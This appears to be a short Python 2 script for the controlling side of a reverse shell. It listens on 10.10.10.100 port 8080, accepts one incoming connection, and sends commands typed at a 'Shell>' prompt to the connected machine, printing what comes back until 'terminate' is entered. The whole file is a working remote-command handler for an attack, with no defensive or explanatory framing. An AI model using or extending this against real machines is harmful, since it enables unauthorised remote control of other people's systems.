import socket  #For builiding TCP Connection


def connect():
	
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("10.10.10.100", 8080))
	s.listen(1)
	conn, addr = s.accept()
	print '[+] We have got a connection from : ', addr
	
	
	while True:
		
		command = raw_input("Shell> ")
		
		if 'terminate' in command:
			conn.send('terminate')
			conn.close() # Close connection with host
			break
		
		else:
			conn.send(command)    # Send command
			print conn.recv(1024)
			
			
def main():
	connect()
main()

	
